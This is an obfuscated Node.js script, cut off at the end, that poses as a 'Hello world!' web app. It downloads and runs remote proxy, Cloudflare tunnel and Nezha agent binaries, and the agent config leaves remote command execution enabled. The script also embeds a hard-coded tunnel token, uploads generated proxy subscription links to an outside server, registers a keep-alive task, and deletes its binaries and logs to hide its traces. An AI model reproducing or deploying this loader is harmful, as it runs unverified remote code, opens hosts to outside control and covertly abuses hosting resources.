const _0x5bca7b=_0x2281;(function(_0x4e81f5,_0x36c806){const _0x399863=_0x2281,_0x5d9acb=_0x4e81f5();while(!![]){try{const _0x2576ff=-parseInt(_0x399863(0x17e))/0x1+parseInt(_0x399863(0xf3))/0x2+parseInt(_0x399863(0x166))/0x3*(parseInt(_0x399863(0xff))/0x4)+parseInt(_0x399863(0x178))/0x5+parseInt(_0x399863(0xf6))/0x6+parseInt(_0x399863(0xfb))/0x7*(-parseInt(_0x399863(0xec))/0x8)+-parseInt(_0x399863(0x151))/0x9;if(_0x2576ff===_0x36c806)break;else _0x5d9acb['push'](_0x5d9acb['shift']());}catch(_0x550cf6){_0x5d9acb['push'](_0x5d9acb['shift']());}}}(_0x576f,0x42e02));const express=require(_0x5bca7b(0xe0)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5bca7b(0x10b)),{promisify}=require(_0x5bca7b(0x173)),exec=promisify(require(_0x5bca7b(0x10d))[_0x5bca7b(0xe3)]),{execSync}=require(_0x5bca7b(0x10d)),UPLOAD_URL=process[_0x5bca7b(0x16a)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x5bca7b(0x16a)][_0x5bca7b(0x168)]||'',AUTO_ACCESS=process[_0x5bca7b(0x16a)][_0x5bca7b(0xe4)]||![],FILE_PATH=process[_0x5bca7b(0x16a)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x5bca7b(0x16a)][_0x5bca7b(0xfe)]||'sub',PORT=process[_0x5bca7b(0x16a)][_0x5bca7b(0x147)]||process[_0x5bca7b(0x16a)][_0x5bca7b(0x119)]||0xbb8,UUID=process[_0x5bca7b(0x16a)]['UUID']||_0x5bca7b(0x10f),NEZHA_SERVER=process[_0x5bca7b(0x16a)][_0x5bca7b(0x14d)]||'',NEZHA_PORT=process['env'][_0x5bca7b(0x165)]||'',NEZHA_KEY=process[_0x5bca7b(0x16a)][_0x5bca7b(0x14e)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x5bca7b(0x12c),ARGO_AUTH=process[_0x5bca7b(0x16a)][_0x5bca7b(0x162)]||'eyJhIjoiZDhkYTliMjEwOTc4MWY0NDA5ODE2YWY2NjkxMzUzMGIiLCJ0IjoiN2QxNjFjNjktNzliMC00MTJmLWEzNWItNWUzNTQ1NTQxZjcyIiwicyI6IllURTJOMlEzTm1JdE5EWmhNUzAwT1RBNExXRTBZVGd0Wm1OaVpHRXpPVEpsWlRoaCJ9',ARGO_PORT=process[_0x5bca7b(0x16a)][_0x5bca7b(0xf9)]||0x1f6d,CFIP=process[_0x5bca7b(0x16a)][_0x5bca7b(0x122)]||_0x5bca7b(0x105),CFPORT=process[_0x5bca7b(0x16a)][_0x5bca7b(0xcb)]||0x1bb,NAME=process[_0x5bca7b(0x16a)][_0x5bca7b(0x128)]||_0x5bca7b(0xd7);!fs[_0x5bca7b(0x102)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x5bca7b(0x12b)](FILE_PATH+_0x5bca7b(0x140))):console['log'](FILE_PATH+_0x5bca7b(0xf1));function _0x2281(_0x4ff579,_0x567bf5){const _0x576fa1=_0x576f();return _0x2281=function(_0x228139,_0x2a96c7){_0x228139=_0x228139-0xc5;let _0x4421f5=_0x576fa1[_0x228139];return _0x4421f5;},_0x2281(_0x4ff579,_0x567bf5);}function generateRandomName(){const _0xf1d9f=_0x5bca7b,_0x582a87=_0xf1d9f(0x17d);let _0x2f8bb5='';for(let _0x591ff7=0x0;_0x591ff7<0x6;_0x591ff7++){_0x2f8bb5+=_0x582a87[_0xf1d9f(0x182)](Math[_0xf1d9f(0x10c)](Math[_0xf1d9f(0x17a)]()*_0x582a87[_0xf1d9f(0x143)]));}return _0x2f8bb5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x5bca7b(0x104)](FILE_PATH,phpName),webPath=path[_0x5bca7b(0x104)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x5bca7b(0x104)](FILE_PATH,_0x5bca7b(0x113)),listPath=path[_0x5bca7b(0x104)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x5bca7b(0x187)),configPath=path[_0x5bca7b(0x104)](FILE_PATH,_0x5bca7b(0x13a));function deleteNodes(){const _0x2556ac=_0x5bca7b;try{if(!UPLOAD_URL)return;if(!fs[_0x2556ac(0x102)](subPath))return;let _0x51661f;try{_0x51661f=fs[_0x2556ac(0x125)](subPath,_0x2556ac(0xd0));}catch{return null;}const _0x1c1868=Buffer[_0x2556ac(0x12d)](_0x51661f,_0x2556ac(0xe1))[_0x2556ac(0xdc)](_0x2556ac(0xd0)),_0x1f56f5=_0x1c1868['split']('\x0a')[_0x2556ac(0xef)](_0x30221a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2556ac(0xf0)](_0x30221a));if(_0x1f56f5[_0x2556ac(0x143)]===0x0)return;return axios[_0x2556ac(0x177)](UPLOAD_URL+_0x2556ac(0x14c),JSON['stringify']({'nodes':_0x1f56f5}),{'headers':{'Content-Type':_0x2556ac(0x11f)}})[_0x2556ac(0x124)](_0xdbfc53=>{return null;}),null;}catch(_0x4f870c){return null;}}function _0x576f(){const _0x5e1d32=['floor','child_process','includes','cf13f827-3a59-4f64-a2f2-83b2fd7034f7','/config.json\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','aarch64','sub.txt','\x0a\x20\x20credentials-file:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','pkill\x20-f\x20\x22[','platform','message','PORT','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','8443','quic','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','application/json','Unhandled\x20error\x20in\x20startserver:','\x20-c\x20\x22','CFIP','2087','catch','readFileSync','stream','Nodes\x20uploaded\x20successfully','NAME','https://amd64.ssss.nyc.mn/agent','https+local://8.8.8.8/dns-query','log','libev.yuyuan.dpdns.org\x20','from','Error\x20downloading\x20files:','send','/sub.txt\x20saved\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','stringify','response','Hello\x20world!','forEach','tunnel.json','split','win32','config.json','php\x20running\x20error:\x20','2083','rm\x20-rf\x20','status','nohup\x20','\x20is\x20created','\x0a\x0atrojan://','ArgoDomain:','length','/vless-argo','https://arm64.ssss.nyc.mn/bot','\x0a\x0avmess://','SERVER_PORT','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','substring','?encryption=none&security=tls&sni=','trojan','/api/delete-nodes','NEZHA_SERVER','NEZHA_KEY','country_code','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','3831390LcjhfF','Download\x20','http\x20server\x20is\x20running\x20on\x20port:','taskkill\x20/f\x20/im\x20','127.0.0.1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/v1','match','tunnel.yml','map','false','ARGO_DOMAIN:','set','&path=%2Fvless-argo%3Fed%3D2560#','writeFileSync','success','firefox','ARGO_AUTH','TunnelSecret','/vmess-argo?ed=2560','NEZHA_PORT','3ZuxWTS','createWriteStream','PROJECT_URL','none','env','\x0aclient_secret:\x20','\x20is\x20running','blackhole','\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Error\x20reading\x20boot.log:','basename','https://arm64.ssss.nyc.mn/web','util','/tunnel.yml\x20run','--tls','countryCode','post','2089530raQkMb','https://oooo.serv00.net/add-url','random','tls','\x22\x20>\x20/dev/null\x202>&1','abcdefghijklmnopqrstuvwxyz','82511ElnPyJ','Error\x20executing\x20command:\x20','2053','NEZHA\x20variable\x20is\x20empty,skip\x20running','charAt','pipe','https://amd64.ssss.nyc.mn/web','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','fileUrl','boot.log','block','&fp=firefox&type=ws&host=','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Subscription\x20uploaded\x20successfully','vmess','statSync','CFPORT','App\x20is\x20running','vless','/trojan-argo','arm64','utf-8','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','true','https://arm64.ssss.nyc.mn/v1','direct','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Content-Type','libev','push','arm','clear','web\x20running\x20error:\x20','toString','https://arm64.ssss.nyc.mn/agent','Skipping\x20adding\x20automatic\x20access\x20task','2096','express','base64','all','exec','AUTO_ACCESS','get','http','pop','/vmess-argo','arch','close','https://amd64.ssss.nyc.mn/bot','62632PIZWAt','unlinkSync','org','filter','test','\x20already\x20exists','error','490612TitEnQ','\x20-s\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','529362mbjWbv','data','\x0avless://','ARGO_PORT','del\x20/f\x20/q\x20','266GtjqSD','/dev/null','has','SUB_PATH','1312824lyOrIK','443','freedom','existsSync','\x20>\x20nul\x202>&1','join','cdns.doon.eu.org','unlink','?security=tls&sni=','unshift','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20failed:\x20','path'];_0x576f=function(){return _0x5e1d32;};return _0x576f();}function cleanupOldFiles(){try{const _0x365fb2=fs['readdirSync'](FILE_PATH);_0x365fb2['forEach'](_0x2aac1f=>{const _0x1dc3ac=_0x2281,_0x2b339a=path[_0x1dc3ac(0x104)](FILE_PATH,_0x2aac1f);try{const _0x5abab0=fs[_0x1dc3ac(0xca)](_0x2b339a);_0x5abab0['isFile']()&&fs[_0x1dc3ac(0xed)](_0x2b339a);}catch(_0x48c212){}});}catch(_0x3bfcbf){}}app[_0x5bca7b(0xe5)]('/',function(_0x225f53,_0x21cee7){const _0x2f8c93=_0x5bca7b;_0x21cee7[_0x2f8c93(0x12f)](_0x2f8c93(0x135));});async function generateConfig(){const _0x1d8473=_0x5bca7b,_0x485409={'log':{'access':_0x1d8473(0xfc),'error':_0x1d8473(0xfc),'loglevel':_0x1d8473(0x169)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1d8473(0xcd),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1d8473(0x169),'fallbacks':[{'dest':0xbb9},{'path':_0x1d8473(0x144),'dest':0xbba},{'path':_0x1d8473(0xe8),'dest':0xbbb},{'path':_0x1d8473(0xce),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1d8473(0x155),'protocol':_0x1d8473(0xcd),'settings':{'clients':[{'id':UUID}],'decryption':_0x1d8473(0x169)},'streamSettings':{'network':'tcp','security':_0x1d8473(0x169)}},{'port':0xbba,'listen':_0x1d8473(0x155),'protocol':_0x1d8473(0xcd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1d8473(0x169),'wsSettings':{'path':_0x1d8473(0x144)}},'sniffing':{'enabled':!![],'destOverride':[_0x1d8473(0xe6),_0x1d8473(0x17b),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1d8473(0x155),'protocol':_0x1d8473(0xc9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1d8473(0x11d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1d8473(0x155),'protocol':_0x1d8473(0x14b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1d8473(0x169),'wsSettings':{'path':_0x1d8473(0xce)}},'sniffing':{'enabled':!![],'destOverride':[_0x1d8473(0xe6),'tls',_0x1d8473(0x11d)],'metadataOnly':![]}}],'dns':{'servers':[_0x1d8473(0x12a)]},'outbounds':[{'protocol':_0x1d8473(0x101),'tag':_0x1d8473(0xd4)},{'protocol':_0x1d8473(0x16d),'tag':_0x1d8473(0xc5)}]};fs['writeFileSync'](path[_0x1d8473(0x104)](FILE_PATH,'config.json'),JSON[_0x1d8473(0x133)](_0x485409,null,0x2));}function getSystemArchitecture(){const _0xe4e793=_0x5bca7b,_0x406b8d=os[_0xe4e793(0xe9)]();return _0x406b8d===_0xe4e793(0xd9)||_0x406b8d===_0xe4e793(0xcf)||_0x406b8d===_0xe4e793(0x112)?_0xe4e793(0xd9):'amd';}function downloadFile(_0x7ec66a,_0x5f033e,_0x20bbdf){const _0x2f2b05=_0x5bca7b,_0x583d4d=_0x7ec66a;!fs[_0x2f2b05(0x102)](FILE_PATH)&&fs[_0x2f2b05(0x11a)](FILE_PATH,{'recursive':!![]});const _0x5a2404=fs[_0x2f2b05(0x167)](_0x583d4d);axios({'method':'get','url':_0x5f033e,'responseType':_0x2f2b05(0x126)})['then'](_0x52a07e=>{const _0x107b83=_0x2f2b05;_0x52a07e['data'][_0x107b83(0x183)](_0x5a2404),_0x5a2404['on']('finish',()=>{const _0x350f5f=_0x107b83;_0x5a2404[_0x350f5f(0xea)](),console['log'](_0x350f5f(0x152)+path[_0x350f5f(0x171)](_0x583d4d)+'\x20successfully'),_0x20bbdf(null,_0x583d4d);}),_0x5a2404['on'](_0x107b83(0xf2),_0x34f991=>{const _0x10e992=_0x107b83;fs[_0x10e992(0x106)](_0x583d4d,()=>{});const _0x450616='Download\x20'+path[_0x10e992(0x171)](_0x583d4d)+_0x10e992(0x10a)+_0x34f991['message'];console['error'](_0x450616),_0x20bbdf(_0x450616);});})['catch'](_0x5bbb8b=>{const _0x10cf19=_0x2f2b05,_0x178e93=_0x10cf19(0x152)+path[_0x10cf19(0x171)](_0x583d4d)+'\x20failed:\x20'+_0x5bbb8b[_0x10cf19(0x118)];console[_0x10cf19(0xf2)](_0x178e93),_0x20bbdf(_0x178e93);});}async function downloadFilesAndRun(){const _0x20e9a8=_0x5bca7b,_0x1e4d20=getSystemArchitecture(),_0x18cc53=getFilesForArchitecture(_0x1e4d20);if(_0x18cc53['length']===0x0){console[_0x20e9a8(0x12b)](_0x20e9a8(0x150));return;}const _0x5e6546=_0x18cc53[_0x20e9a8(0x15a)](_0x405730=>{return new Promise((_0x5195dc,_0x466e36)=>{const _0x5221ee=_0x2281;downloadFile(_0x405730['fileName'],_0x405730[_0x5221ee(0x186)],(_0xf1be04,_0x5754e4)=>{_0xf1be04?_0x466e36(_0xf1be04):_0x5195dc(_0x5754e4);});});});try{await Promise[_0x20e9a8(0xe2)](_0x5e6546);}catch(_0x434ab1){console['error'](_0x20e9a8(0x12e),_0x434ab1);return;}function _0x4bf02b(_0x5455df){const _0xb76458=_0x20e9a8,_0x206af7=0x1fd;_0x5455df[_0xb76458(0x136)](_0x1a983d=>{const _0x57477e=_0xb76458;fs[_0x57477e(0x102)](_0x1a983d)&&fs['chmod'](_0x1a983d,_0x206af7,_0x80e608=>{const _0x1240af=_0x57477e;_0x80e608?console[_0x1240af(0xf2)]('Empowerment\x20failed\x20for\x20'+_0x1a983d+':\x20'+_0x80e608):console[_0x1240af(0x12b)]('Empowerment\x20success\x20for\x20'+_0x1a983d+':\x20'+_0x206af7[_0x1240af(0xdc)](0x8));});});}const _0x2a9385=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4bf02b(_0x2a9385);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11bdbb=NEZHA_SERVER[_0x20e9a8(0x10e)](':')?NEZHA_SERVER['split'](':')[_0x20e9a8(0xe7)]():'',_0x3baed6=new Set(['443',_0x20e9a8(0x11c),_0x20e9a8(0xdf),'2087','2083',_0x20e9a8(0x180)]),_0x3070e4=_0x3baed6[_0x20e9a8(0xfd)](_0x11bdbb)?_0x20e9a8(0xd2):_0x20e9a8(0x15b),_0x50a34b=_0x20e9a8(0x16b)+NEZHA_KEY+_0x20e9a8(0x156)+NEZHA_SERVER+_0x20e9a8(0x131)+_0x3070e4+_0x20e9a8(0x16f)+UUID;fs['writeFileSync'](path[_0x20e9a8(0x104)](FILE_PATH,'config.yaml'),_0x50a34b);const _0x28414b=_0x20e9a8(0x13f)+phpPath+_0x20e9a8(0x121)+FILE_PATH+_0x20e9a8(0x185);try{await exec(_0x28414b),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x462203=>setTimeout(_0x462203,0x3e8));}catch(_0x7d0904){console[_0x20e9a8(0xf2)](_0x20e9a8(0x13b)+_0x7d0904);}}else{let _0x25a60c='';const _0xca61e7=[_0x20e9a8(0x100),_0x20e9a8(0x11c),'2096',_0x20e9a8(0x123),_0x20e9a8(0x13c),_0x20e9a8(0x180)];_0xca61e7[_0x20e9a8(0x10e)](NEZHA_PORT)&&(_0x25a60c=_0x20e9a8(0x175));const _0x3bb10f='nohup\x20'+npmPath+_0x20e9a8(0xf4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x25a60c+_0x20e9a8(0xd5);try{await exec(_0x3bb10f),console[_0x20e9a8(0x12b)](npmName+_0x20e9a8(0x16c)),await new Promise(_0xb923b8=>setTimeout(_0xb923b8,0x3e8));}catch(_0x166c16){console[_0x20e9a8(0xf2)]('npm\x20running\x20error:\x20'+_0x166c16);}}}else console[_0x20e9a8(0x12b)](_0x20e9a8(0x181));const _0x59552b='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x20e9a8(0x110);try{await exec(_0x59552b),console[_0x20e9a8(0x12b)](webName+_0x20e9a8(0x16c)),await new Promise(_0x1a37ad=>setTimeout(_0x1a37ad,0x3e8));}catch(_0x402cd7){console['error'](_0x20e9a8(0xdb)+_0x402cd7);}if(fs[_0x20e9a8(0x102)](botPath)){let _0x39ae8c;if(ARGO_AUTH[_0x20e9a8(0x158)](/^[A-Z0-9a-z=]{120,250}$/))_0x39ae8c=_0x20e9a8(0xf5)+ARGO_AUTH;else ARGO_AUTH[_0x20e9a8(0x158)](/TunnelSecret/)?_0x39ae8c=_0x20e9a8(0x132)+FILE_PATH+_0x20e9a8(0x174):_0x39ae8c=_0x20e9a8(0x11b)+FILE_PATH+_0x20e9a8(0x11e)+ARGO_PORT;try{await exec(_0x20e9a8(0x13f)+botPath+'\x20'+_0x39ae8c+_0x20e9a8(0x16e)),console['log'](botName+_0x20e9a8(0x16c)),await new Promise(_0x2af6fe=>setTimeout(_0x2af6fe,0x7d0));}catch(_0x1c9104){console[_0x20e9a8(0xf2)](_0x20e9a8(0x17f)+_0x1c9104);}}await new Promise(_0x50116e=>setTimeout(_0x50116e,0x1388));}function getFilesForArchitecture(_0x15f270){const _0x13970f=_0x5bca7b;let _0xda577d;_0x15f270===_0x13970f(0xd9)?_0xda577d=[{'fileName':webPath,'fileUrl':_0x13970f(0x172)},{'fileName':botPath,'fileUrl':_0x13970f(0x145)}]:_0xda577d=[{'fileName':webPath,'fileUrl':_0x13970f(0x184)},{'fileName':botPath,'fileUrl':_0x13970f(0xeb)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x28dc0c=_0x15f270===_0x13970f(0xd9)?_0x13970f(0xdd):_0x13970f(0x129);_0xda577d[_0x13970f(0x108)]({'fileName':npmPath,'fileUrl':_0x28dc0c});}else{const _0x1f8730=_0x15f270===_0x13970f(0xd9)?_0x13970f(0xd3):_0x13970f(0x157);_0xda577d['unshift']({'fileName':phpPath,'fileUrl':_0x1f8730});}}return _0xda577d;}function argoType(){const _0x1b6a9e=_0x5bca7b;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x1b6a9e(0xc7));return;}if(ARGO_AUTH[_0x1b6a9e(0x10e)](_0x1b6a9e(0x163))){fs['writeFileSync'](path['join'](FILE_PATH,_0x1b6a9e(0x137)),ARGO_AUTH);const _0x56ec55='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1b6a9e(0x138)]('\x22')[0xb]+_0x1b6a9e(0x114)+path['join'](FILE_PATH,_0x1b6a9e(0x137))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1b6a9e(0x148)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1b6a9e(0x15f)](path[_0x1b6a9e(0x104)](FILE_PATH,_0x1b6a9e(0x159)),_0x56ec55);}else console[_0x1b6a9e(0x12b)](_0x1b6a9e(0xd1));}async function extractDomains(){const _0x256b47=_0x5bca7b;let _0x1f4e92;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1f4e92=ARGO_DOMAIN,console[_0x256b47(0x12b)](_0x256b47(0x15c),_0x1f4e92),await _0x2b64f0(_0x1f4e92);else try{const _0xd9f08e=fs[_0x256b47(0x125)](path['join'](FILE_PATH,'boot.log'),_0x256b47(0xd0)),_0x38a6a3=_0xd9f08e['split']('\x0a'),_0x146112=[];_0x38a6a3[_0x256b47(0x136)](_0x40f2c7=>{const _0x2dc0c8=_0x256b47,_0x2e3bcd=_0x40f2c7[_0x2dc0c8(0x158)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2e3bcd){const _0x35845d=_0x2e3bcd[0x1];_0x146112[_0x2dc0c8(0xd8)](_0x35845d);}});if(_0x146112[_0x256b47(0x143)]>0x0)_0x1f4e92=_0x146112[0x0],console[_0x256b47(0x12b)](_0x256b47(0x142),_0x1f4e92),await _0x2b64f0(_0x1f4e92);else{console['log'](_0x256b47(0x115)),fs[_0x256b47(0xed)](path[_0x256b47(0x104)](FILE_PATH,_0x256b47(0x187)));async function _0x391065(){const _0xf9a638=_0x256b47;try{process[_0xf9a638(0x117)]===_0xf9a638(0x139)?await exec(_0xf9a638(0x154)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xf9a638(0x116)+botName[_0xf9a638(0x182)](0x0)+']'+botName[_0xf9a638(0x149)](0x1)+_0xf9a638(0x17c));}catch(_0x943a8c){}}_0x391065(),await new Promise(_0x4a25d8=>setTimeout(_0x4a25d8,0xbb8));const _0x584ef8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x584ef8+_0x256b47(0x16e)),console['log'](botName+_0x256b47(0x16c)),await new Promise(_0x18d4a6=>setTimeout(_0x18d4a6,0xbb8)),await extractDomains();}catch(_0x10fa66){console[_0x256b47(0xf2)](_0x256b47(0x17f)+_0x10fa66);}}}catch(_0x752945){console[_0x256b47(0xf2)](_0x256b47(0x170),_0x752945);}async function _0xb1ed39(){const _0x5d0505=_0x256b47;try{const _0x4f324d=await axios[_0x5d0505(0xe5)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x4f324d[_0x5d0505(0xf7)]&&_0x4f324d[_0x5d0505(0xf7)][_0x5d0505(0x14f)]&&_0x4f324d[_0x5d0505(0xf7)][_0x5d0505(0xee)])return _0x4f324d[_0x5d0505(0xf7)]['country_code']+'_'+_0x4f324d[_0x5d0505(0xf7)][_0x5d0505(0xee)];}catch(_0x2142b7){try{const _0x4a6828=await axios[_0x5d0505(0xe5)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4a6828[_0x5d0505(0xf7)]&&_0x4a6828[_0x5d0505(0xf7)]['status']===_0x5d0505(0x160)&&_0x4a6828['data'][_0x5d0505(0x176)]&&_0x4a6828[_0x5d0505(0xf7)]['org'])return _0x4a6828[_0x5d0505(0xf7)][_0x5d0505(0x176)]+'_'+_0x4a6828[_0x5d0505(0xf7)][_0x5d0505(0xee)];}catch(_0x365708){}}return'Unknown';}async function _0x2b64f0(_0x2407b0){const _0x3c56a6=await _0xb1ed39(),_0x1fe11d=NAME?NAME+'-'+_0x3c56a6:_0x3c56a6;return new Promise(_0x543ab5=>{setTimeout(()=>{const _0x110836=_0x2281,_0x47e968={'v':'2','ps':''+_0x1fe11d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2407b0,'path':_0x110836(0x164),'tls':'tls','sni':_0x2407b0,'alpn':'','fp':_0x110836(0x161)},_0x19abe7=_0x110836(0xf8)+UUID+'@'+CFIP+':'+CFPORT+_0x110836(0x14a)+_0x2407b0+_0x110836(0xc6)+_0x2407b0+_0x110836(0x15e)+_0x1fe11d+_0x110836(0x146)+Buffer[_0x110836(0x12d)](JSON['stringify'](_0x47e968))[_0x110836(0xdc)](_0x110836(0xe1))+_0x110836(0x141)+UUID+'@'+CFIP+':'+CFPORT+_0x110836(0x107)+_0x2407b0+_0x110836(0xc6)+_0x2407b0+_0x110836(0x111)+_0x1fe11d+'\x0a\x20\x20\x20\x20';console[_0x110836(0x12b)](Buffer[_0x110836(0x12d)](_0x19abe7)['toString'](_0x110836(0xe1))),fs[_0x110836(0x15f)](subPath,Buffer[_0x110836(0x12d)](_0x19abe7)[_0x110836(0xdc)](_0x110836(0xe1))),console[_0x110836(0x12b)](FILE_PATH+_0x110836(0x130)),uploadNodes(),app[_0x110836(0xe5)]('/'+SUB_PATH,(_0x323242,_0x4853b9)=>{const _0x1aabd2=_0x110836,_0x21a986=Buffer['from'](_0x19abe7)['toString'](_0x1aabd2(0xe1));_0x4853b9[_0x1aabd2(0x15d)](_0x1aabd2(0xd6),'text/plain;\x20charset=utf-8'),_0x4853b9['send'](_0x21a986);}),_0x543ab5(_0x19abe7);},0x7d0);});}}async function uploadNodes(){const _0x1856b6=_0x5bca7b;if(UPLOAD_URL&&PROJECT_URL){const _0x319629=PROJECT_URL+'/'+SUB_PATH,_0x25a68f={'subscription':[_0x319629]};try{const _0x570911=await axios[_0x1856b6(0x177)](UPLOAD_URL+'/api/add-subscriptions',_0x25a68f,{'headers':{'Content-Type':_0x1856b6(0x11f)}});return _0x570911&&_0x570911[_0x1856b6(0x13e)]===0xc8?(console[_0x1856b6(0x12b)](_0x1856b6(0xc8)),_0x570911):null;}catch(_0x1f6980){if(_0x1f6980[_0x1856b6(0x134)]){if(_0x1f6980['response'][_0x1856b6(0x13e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1856b6(0x102)](listPath))return;const _0xd82139=fs[_0x1856b6(0x125)](listPath,_0x1856b6(0xd0)),_0x13556b=_0xd82139[_0x1856b6(0x138)]('\x0a')['filter'](_0x1bb5dc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1856b6(0xf0)](_0x1bb5dc));if(_0x13556b[_0x1856b6(0x143)]===0x0)return;const _0x3febe2=JSON[_0x1856b6(0x133)]({'nodes':_0x13556b});try{const _0x3a332d=await axios[_0x1856b6(0x177)](UPLOAD_URL+'/api/add-nodes',_0x3febe2,{'headers':{'Content-Type':_0x1856b6(0x11f)}});return _0x3a332d&&_0x3a332d[_0x1856b6(0x13e)]===0xc8?(console[_0x1856b6(0x12b)](_0x1856b6(0x127)),_0x3a332d):null;}catch(_0x7fc7f8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x366ad6=_0x2281,_0x49cc73=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x49cc73[_0x366ad6(0xd8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x49cc73[_0x366ad6(0xd8)](phpPath);process[_0x366ad6(0x117)]===_0x366ad6(0x139)?exec(_0x366ad6(0xfa)+_0x49cc73[_0x366ad6(0x104)]('\x20')+_0x366ad6(0x103),_0x369bc8=>{const _0x246a56=_0x366ad6;console[_0x246a56(0xda)](),console[_0x246a56(0x12b)](_0x246a56(0xcc)),console[_0x246a56(0x12b)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x366ad6(0x13d)+_0x49cc73[_0x366ad6(0x104)]('\x20')+'\x20>/dev/null\x202>&1',_0x539c5e=>{const _0x475dcb=_0x366ad6;console[_0x475dcb(0xda)](),console[_0x475dcb(0x12b)](_0x475dcb(0xcc)),console[_0x475dcb(0x12b)](_0x475dcb(0x109));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4346c7=_0x5bca7b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4346c7(0x12b)](_0x4346c7(0xde));return;}try{const _0x1013ec=await axios[_0x4346c7(0x177)](_0x4346c7(0x179),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4346c7(0x11f)}});return console[_0x4346c7(0x12b)]('automatic\x20access\x20task\x20added\x20successfully'),_0x1013ec;}catch(_0x58d9f6){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x58d9f6[_0x4346c7(0x118)]),null;}}async function startserver(){const _0x319195=_0x5bca7b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 